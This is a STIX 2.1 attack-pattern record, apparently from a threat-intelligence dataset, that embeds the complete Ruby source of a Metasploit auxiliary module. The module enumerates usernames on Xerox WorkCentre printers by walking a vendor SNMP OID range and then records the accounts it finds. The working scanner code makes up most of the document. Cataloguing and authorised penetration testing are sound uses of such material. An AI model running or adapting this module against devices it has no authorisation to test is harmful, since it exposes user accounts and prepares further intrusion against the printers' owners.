{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ac47826-19ce-49de-a3e2-9e45b8f0e4a7",
    "created": "2024-08-14T16:27:47.688937Z",
    "modified": "2024-08-14T16:27:47.688957Z",
    "name": "Xerox WorkCentre User Enumeration (SNMP)",
    "description": " This module will do user enumeration based on the Xerox WorkCentre present on the network. SNMP is used to extract the usernames. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/xerox_workcentre_enumusers.rb",
            "external_id": "xerox_workcentre_enumusers.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Xerox WorkCentre User Enumeration (SNMP)',\n      'Description'    => %q{\n          This module will do user enumeration based on the Xerox WorkCentre present on the network.\n          SNMP is used to extract the usernames.\n      },\n      'Author'         =>\n        [\n          'pello <fropert[at]packetfault.org>'\n        ],\n      'License'        => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n    begin\n      snmp = connect_snmp\n\n      if snmp.get_value('sysDescr.0') =~ /Xerox/\n        @users = []\n        285222001.upto(285222299) { |oidusernames|\n          snmp.walk(\"1.3.6.1.4.1.253.8.51.5.1.1.4.151.#{oidusernames}\") do |row|\n            row.each { |val| @users << val.value.to_s if val.value.to_s.length >= 1 }\n          end\n        }\n        print_good(\"#{ip} Found Users: #{@users.uniq.sort.join(\", \")} \")\n\n        @users.each do |user|\n          report_note(\n          :host => rhost,\n          :port => datastore['RPORT'],\n          :proto => 'udp',\n          :sname => 'snmp',\n          :update => :unique_data,\n          :type => 'xerox.workcenter.user',\n          :data => user)\n        end\n      end\n\n    # No need to make noise about timeouts\n    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"#{ip} Error: #{e.class} #{e} #{e.backtrace}\")\n    ensure\n      disconnect_snmp\n    end\n  end\nend\n"
}